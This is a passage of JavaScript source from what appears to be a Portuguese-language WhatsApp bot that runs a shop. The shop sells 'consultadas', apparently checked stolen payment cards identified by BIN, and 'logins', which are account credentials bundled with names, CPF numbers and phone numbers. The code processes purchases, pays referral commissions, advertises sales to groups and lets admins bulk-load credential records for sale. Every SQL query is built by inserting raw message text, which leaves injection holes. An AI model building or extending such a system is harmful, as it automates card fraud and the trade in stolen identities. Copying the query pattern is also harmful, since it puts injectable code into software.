                        PERCENTUAL_ADICIONAL_ASSOCIADO = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        if (PERCENTUAL_ADICIONAL_ASSOCIADO.toString() != "0") {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT PERCENTUAL_ADICIONAL_ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["PERCENTUAL_ADICIONAL_ASSOCIADO"]
                        } else {
                            PERCENTUAL_FINAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PERCENTUAL_ASSO_GERAL'`).get()["VALOR"]
                        }

                        PIX_OU_COMPRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'PIX_OU_COMPRA'`).get()["VALOR"]
                        if (PIX_OU_COMPRA === "1") {

                        } else if (PIX_OU_COMPRA === "2") {
                            VALOR_ADD_INDICADOR = ((parseFloat(PERCENTUAL_FINAL) * parseFloat(VALOR_BASE_INDIC)) / 100);
                            VALOR_ADD_INDICADOR = parseFloat(VALOR_ADD_INDICADOR).toFixed(2)
                            console.log(`VALOR_ADD_INDICADOR: ${VALOR_ADD_INDICADOR}`)

                            SALDO_INDICACAO = await DataBase_Better.prepare(`SELECT SALDO_INDICACAO FROM CONTATOS WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).get()["SALDO_INDICACAO"]
                            SALDO_INDICACAO = parseFloat(SALDO_INDICACAO).toFixed(2)
                            console.log(`SALDO_INDICACAO: ${SALDO_INDICACAO}`)

                            NOVO_SALDO_INDICACAO = parseFloat(SALDO_INDICACAO) + parseFloat(VALOR_ADD_INDICADOR)
                            NOVO_SALDO_INDICACAO = parseFloat(NOVO_SALDO_INDICACAO).toFixed(2)
                            console.log(`NOVO_SALDO_INDICACAO: ${NOVO_SALDO_INDICACAO}`)

                            await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO_INDICACAO = '${NOVO_SALDO_INDICACAO}' WHERE ID_CONTATO = '${NUMERO_INDICADOR}'`).run()
                            console.log(`Indicador:${NUMERO_INDICADOR} ganhou R$:${VALOR_ADD_INDICADOR}`)
                        }
                    }
                }
            }

            MENSAGEM_AO_COMPRAR_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CONSULTADA'`).get()["VALOR"]

            Texto_Usuario = `💳 *CONSULTADA COMPRADA* 💳

⏰ *DATA DA COMPRA:* ${new Date(parseInt(Date.now())).toLocaleString()}
💰 *VALOR CONSULTADA:* R$: ${PRECO_MATERIAL}

💳 BIN: ${BIN}
${INFORMACOES_ADICIONAIS}
═══════❖═══════
${MENSAGEM_AO_COMPRAR_CONSULTADA}`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}', 
'sendImage',
'${Texto_Usuario}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Consultada_PV}',
'${Date.now()}')`).run()

            Texto_Grupo = `💳 *USUÁRIO COMPROU UMA CONSULTADA* 💳

👤 *USUÁRIO:* wa.me/${Numero}

💰 *SALDO DISPONÍVEL NA CONSUL:* R$: ${SALDO}
💰 *PREÇO DA CONSULTADA:* R$: ${PRECO_MATERIAL}

*VENHA ADQUIRIR AS MELHORES CONSULTADAS DO MERCADO!*

*ATENDIMENTO 100% AUTOMÁTICO!*

Este é o número do BOT, mande qualquer mensagem!
wa.me/${NUMERO_PURO_BOT}`

            NOT_COMPROU_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM NOTIFICACOES_GRUPOS WHERE PARAMETRO = 'NOT_COMPROU_CONSULTADA'`).get()["VALOR"]
            if (NOT_COMPROU_CONSULTADA === "1") {
                for await (Grupo of ID_GRUPOS) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Grupo["ID_GRUPO"]}', 
'sendImage',
'${Texto_Grupo}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'${FOTO_Comprou_Consultada_GP}',
'${Date.now()}')`).run()
                }
            }

            Texto_Adms = `💳 *CONSULTADA COMPRADA* 💳

👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
💰 *VALOR CONSULTADA:* R$: ${SALDO}
💰 *PREÇO DA CONSULTADA:* R$: ${PRECO_MATERIAL}

${INFORMACOES_ADICIONAIS}`

            for await (adm of Adms) {
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto_Adms}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            }
            console.log(`Consultada Comprada! Numero: wa.me/${Numero} | Valor: ${PRECO_MATERIAL}`)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳



        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 

        //addloginmanual1===SERVIÇO===EMAIL===SENHA===NOME===CPF===USER===TELEFONE===ESTADO===CIDADE===PREÇO===ADICIONAL
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addloginmanual1===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            bMensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO LOGINS MODO MANUAL 1..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = bMensagem_Texto.split("/addloginmanual1===")
                Linhas.splice(0, 1);
                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        for (var index = 0; index < Linhas.length; index++) {
                            Abastecendo = true

                            try {

                                Div = Linhas[index].split("===")

                                console.log(`Inserindo: ${Div[1]}`)

                                SERVICO = Div[0].toUpperCase()
                                EMAIL = Div[1]
                                SENHA = Div[2]
                                NOME = Div[3]
                                CPF = Div[4]
                                USER = Div[5]
                                TELEFONE = Div[6]
                                ESTADO = Div[7].toUpperCase()
                                CIDADE = Div[8].toUpperCase()
                                PRECO = Div[9]
                                ADICIONAIS = Div[10]
                                DATA_MS_INSERIDO = Date.now()

                                db.run(`INSERT INTO LOGINS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                            } catch (error) {
                                console.log(error)

                                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                                for await (adm of Adms) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                                }
                                Abastecendo = false
                                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            }
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Logins Colocados para abastecimento.

${Contagem_Abastecidas} Logins Abastecidas.`
                        for await (adm of Adms) {
                            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //addloginsimples===SERVICO===PREÇO===INFORMACÕES_ADICIONAIS
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/addloginsimples===") > -1 && Adms.includes(Numero)) {

            Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
            msg = Mensagem_Texto.split("===")

            if (msg[1] === "") {
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            bMensagem_Texto = Mensagem_Texto.replace(/\'/igm, "")

            Array_Fila_Espera = []
            try {
                Texto = "ABASTECENDO LOGINS MODO SIMPLES..."
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                Linhas = bMensagem_Texto.split("/addloginsimples===")
                Linhas.splice(0, 1);
                try {
                    Contagem_Abastecidas = 0

                    db = new sqlite3.Database(Diretorio_SQLITE_Principal);
                    db.serialize(async function () {
                        db.run("begin transaction");

                        for (var index = 0; index < Linhas.length; index++) {
                            Abastecendo = true

                            try {

                                Div = Linhas[index].split("===")

                                console.log(`Inserindo: ${Div[1]}`)

                                SERVICO = Div[0].toUpperCase()
                                EMAIL = "0"
                                SENHA = "0"
                                NOME = "0"
                                CPF = "§"
                                USER = "0"
                                TELEFONE = "0"
                                ESTADO = "0"
                                CIDADE = "0"
                                PRECO = Div[1]
                                ADICIONAIS = Div[2]
                                DATA_MS_INSERIDO = Date.now()

                                db.run(`INSERT INTO LOGINS (SERVICO,EMAIL,SENHA,NOME,CPF,USER,TELEFONE,ESTADO,CIDADE,ADICIONAIS,PRECO,DATA_MS_INSERIDO) VALUES ('${SERVICO}','${EMAIL}','${SENHA}','${NOME}','${CPF}','${USER}','${TELEFONE}','${ESTADO}','${CIDADE}','${ADICIONAIS}','${PRECO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
                                Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1
                            } catch (error) {
                                console.log(error)

                                Texto = `*Ocorreu algum problema no abastecimento.*

Já tinha abastecido ${Contagem_Abastecidas}.

Erro: ${error}`
                                for await (adm of Adms) {
                                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                                }
                                Abastecendo = false
                                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                            }
                        }

                        if (Contagem_Abastecidas != 0) {
                            console.log("comitando")
                            db.run("commit");
                        }

                        for await (adm of Adms) {
                            Texto = `*ABASTECIMENTO FINALIZADO*

${Linhas.length} Logins Colocados para abastecimento.

${Contagem_Abastecidas} Logins Abastecidas.`
                            for await (adm of Adms) {
                                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                            }
                        }
                        Abastecendo = false
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    });
                } catch (error) {
                    Texto = `Erro === ${error}`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
            } catch (error) {
                Texto = `Erro === ${error}`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            return
        }
